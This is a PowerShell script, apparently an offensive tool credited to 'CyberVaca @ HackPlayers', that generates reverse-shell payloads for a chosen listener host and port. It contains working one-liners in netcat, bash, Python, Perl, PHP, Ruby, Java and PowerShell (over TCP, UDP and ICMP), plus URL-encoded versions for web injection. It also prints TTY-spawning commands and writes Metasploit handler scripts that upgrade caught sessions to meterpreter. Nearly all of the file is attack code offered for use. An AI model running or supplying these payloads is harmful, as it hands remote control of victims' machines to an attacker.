param(
[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP

)




$metasploit_perl = @"
use exploit/multi/handler
set payload cmd/unix/reverse_perl
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_python = @"
use exploit/multi/handler
set payload cmd/unix/reverse_python
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_ruby = @"
use exploit/multi/handler
set payload cmd/unix/reverse_ruby
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_java = @"
use exploit/multi/handler
set payload java/shell/reverse_tcp
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_bash = @"
use exploit/multi/handler
set payload cmd/unix/reverse_netcat
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_xterm = @"
use exploit/multi/handler
set payload cmd/unix/generic
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$metasploit_php = @"
use exploit/multi/handler
set payload php/reverse_php
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
<ruby>
x = 0
    sleep(1)

    print_status("Esperando session para actualizarla a meterpreter")
    while (x == 0)
        framework.sessions.each_pair do |sid,s|
            thost = s.session_host
            print_status("Detectada nueva session")
                self.run_single("use post/multi/manage/shell_to_meterpreter")
                self.run_single("set session 1")
                        self.run_single("set LHOST $Lhost")
                        self.run_single("set LPORT 12345")
                        self.run_single("exploit")
        x += 2
        end
        sleep(1)
    end

    print_status("Shell actualizada a meterpreter")
</ruby>
"@

$banner1 = @"

 ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████      ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄      ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░      ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░        ░  ░     ░     ░  ░   ░           ░     ░  ░         ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                    ░                                                                              


                                                                       CyberVaca @ HackPlayers
"@

Write-Host $banner1 -ForegroundColor red
if ($Lhost -eq "" -or $Lhost -eq "") {

break

}

if ($netcat -eq $false -and $python -eq $false -and $python3 -eq $false -and $bash -eq $false -and $perl -eq $false -and $php -eq $false -and $ruby -eq $false -and $java -eq $false -and $PowershellICMP -eq $false -and $PowershellTCP -eq $false -and $PowershellUDP -eq $false) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Debes seleccionar el lenguaje de la shell `n`n" -ForegroundColor red; break }

$r_netcat = @"
mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc $Lhost $Lport 1>/tmp/backpipe
"@

$r_python = @"
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$Lhost",$Lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"@
$r_bash = @"
bash -i >& /dev/tcp/$Lhost/$Lport 0>&1
"@
$r_perl = @"
perl -e 'use Socket;$`i="$Lhost";`$p=$Lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(`$p,inet_aton(`$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
"@
$r_php = @"
php -r '`$sock=fsockopen("$Lhost",$Lport);exec("/bin/sh -i <&3 >&3 2>&3");'
"@
$r_ruby = @"
ruby -rsocket -e'f=TCPSocket.open("$Lhost",$Lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
"@
$r_java = @"
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$Lhost/$Lport;cat <&5 | while read line; do \`$line 2>&5 >&5; done"] as String[])
p.waitFor()"@
$r_xterm = @"
xterm -display $Lhost":"$Lport
"@
$r_PowershellICMP = @"
`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('C:\Temp\z',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }
"@

$r_PowershellTCP = @"
`$c = New-Object System.Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (iex `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()
"@

$r_PowershellUDP = @"
`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (iex `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()
"@



if ($web -eq $true) {

Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 
$r_net

if ($python3 -eq $true) {$r_python = $r_python -replace "python","python3" -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ;$total = $r_python.Length - 3; $r_python = $r_python.Substring(0,$total); write-host "$r_python `n" }
if ($python -eq $true) {$r_python = $r_python -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_python.Length - 3; $r_python = $r_python.Substring(0,$total) ; write-host "$r_python `n" }
if ($bash -eq $true) {$r_bash = $r_bash  -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_bash.Length -3; $r_bash = $r_bash.Substring(0,$total); write-host "$r_bash `n" }
if ($perl -eq $true) {$r_perl = $r_perl -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_perl.Length -3 ; $r_perl = $r_perl.Substring(0,$total) ;write-host "$r_perl `n"}
if ($php -eq $true) {$r_php = $r_php -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_php.Length -3 ;$r_php = $r_php.Substring(0,$total); write-host "$r_php `n"}
if ($ruby -eq $true) {$r_ruby =  $r_ruby -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_ruby.Length -3; $r_ruby = $r_ruby.Substring(0,$total); write-host "$r_ruby `n"}
if ($java -eq $true) {$r_java = $r_java-replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_java.Length -3; $r_java = $r_java.Substring(0,$total); write-host "$r_java `n"}
if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_xterm.Length -3 ; $r_xterm = $r_xterm.Substring(0,$total); write-host "$r_xterm `n"}
if ($netcat -eq $true) {$r_netcat = $r_netcat -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_netcat.Length -3 ; $r_netcat = $r_netcat.Substring(0,$total);write-host "$r_netcat `n"}

################################################################################ Spawn tty shell ################################################################################

if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }


################################################################################ Metasploit ################################################################################

if ($python3 -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($python -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($bash -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($perl -eq $true -and $metasploit -eq $true) {$metasploit_perl | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($netcat -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
}

else {

Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 



if ($netcat -eq $true) {write-host $r_netcat "`n" }
if ($python -eq $true) {write-host $r_python "`n"  }
if ($python3 -eq $true) {$r_python = $r_python -replace "python", "python3" ;write-host $r_python "`n"  }
if ($bash -eq $true) {write-host $r_bash "`n" }
if ($perl -eq $true) {write-host $r_perl "`n"}
if ($php -eq $true) {write-host $r_php  "`n"}
if ($ruby -eq $true) {write-host $r_ruby "`n"}
if ($java -eq $true) {write-host $r_java "`n"}
if ($xterm -eq $true) {write-host $r_xterm "`n"}
if ($PowershellICMP -eq $true) {write-host $r_PowershellICMP "`n"}
if ($PowershellTCP -eq $true) {write-host $r_PowershellTCP "`n"}
if ($PowershellUDP -eq $true) {write-host $r_PowershellUDP "`n"}

################################################################################ Spawn tty shell ################################################################################

if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }


################################################################################ Metasploit ################################################################################

if ($python -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($bash -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($perl -eq $true -and $metasploit -eq $true) {$metasploit_perl | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($netcat -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($PowershellICMP -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellICMP (proximas updates...) `n" }
if ($PowershellTCP -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellTCP (proximas updates...)`n" }
if ($Powershelludp -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellUDP (proximas updates...)`n" }

}



